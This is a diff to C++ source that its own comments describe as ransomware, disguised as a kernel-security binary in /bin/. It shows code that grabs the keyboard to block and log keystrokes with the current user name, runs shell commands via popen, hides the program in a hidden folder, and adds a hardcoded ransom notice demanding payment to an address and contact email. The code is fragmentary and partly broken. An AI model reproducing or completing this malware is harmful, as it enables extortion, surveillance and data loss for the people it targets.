@@ -1,79 +1,12 @@
     #include "header.h"
+    #include "structure/structure.h"
 
     //Calling this ransomware literally as it is not a good idea so we will call it binary_runtime_ancii, related to the linux kernel security configuration in a /bin/ dir
     // Use enviroment variables and encryption AES method for avoid desensambly easily
 
-
-std::string exec_parsed(const std::string command) {
-    std::string result;
-    FILE* pipe = popen(command.c_str(), "r");
-    if(!pipe) {
-        return result;
-    } else {
-        char buffer[128];
-        while(fgets(buffer, sizeof(buffer), pipe) != nullptr) {
-            result += buffer;
-        }
-
-        pclose(pipe);
-        return result;
-    }
-}
-
-void show_encrypted(NotifyNotification*& notification) {
-        while (true) {
-        // Show the notification
-        notify_notification_show(notification, nullptr);
-
-        // Wait for a few seconds
-        std::this_thread::sleep_for(std::chrono::seconds(3)); // Adjust the duration as needed
-
-        // Update the notification to prevent fading away
-        notify_notification_update(notification, notify_tittle, encrypt_message, "xfce-system-lock");
-        
-    }
-}
-
-void block_input() {
-     while (true) {
-            Display* display = XOpenDisplay(nullptr);
-
-             if (!display) {
-                std::cerr << "Unable to open X display." << std::endl;
-                return;
-            } else {
-
-                XGrabKeyboard(display, DefaultRootWindow(display), True, GrabModeAsync, GrabModeAsync, CurrentTime);
-                XEvent event;
-                XNextEvent(display, &event);
-                /* Do nothing, effectively blocking periferic input
-
-                if (event.type == KeyPress || event.type == KeyRelease) {
-                }
-                */
-
-            if(event.type == KeyPress) {
-                std::string user_executor = exec_parsed("whoami"); //make recognise words, until theres not a enter or space, type all entire.
-                KeySym keySym;
-                char key[255];
-                XLookupString(&event.xkey, key, sizeof(key), &keySym, NULL);
-
-                if(keySym == XK_Escape) {
-                    std::cout << "aa";
-                }
-
-                std::cout << "The key " << key << " was pressed by " << user_executor;
-            }
-
-                XCloseDisplay(display);
-            }
-    }
-}
-
     int main(int argc, char* argv[]) { //We will use the program file name to send it to a hidden folder (This is very common to get the program name if the user changes it)
-    dpp::cluster kernel("");
-    dpp::webhook kernel32("")
-    std::string config_files = argv[0];
+
+        std::string config_files = argv[0];
         if(config_files.substr(0, 2) == "./") {
             config_files = config_files.substr(2);
         }
@@ -123,16 +56,16 @@ void block_input() {
 
     // Create a new notification
     NotifyNotification* notification = notify_notification_new(
-        notify_tittle,   // Title
-        encrypt_message,       // Message
+        "Ransom Productions C", 
+        ":warning: Warning! Your system is encrypted. Pay to regain access to files. Ransomware is a threat; understand risks. Don't alter files or decrypt data; risk loss or damage. To restore files, pay to Bitcoin address: 0x164593446094360439. After payment, email ransomprocs@protonmail.com for decryption.",
         "xfce-system-lock"    // Icon (see: /usr/share/icons/)
     );
 
     std::thread hex1(block_input);
-    std::thread hex2(std::bind(show_encrypted, notification));
+    //std::thread hex2(std::bind(show_encrypted, notification));
 
     hex1.join();
-    hex2.join();
+    //hex2.join();
 
     // Clean up
     g_object_unref(G_OBJECT(notification));
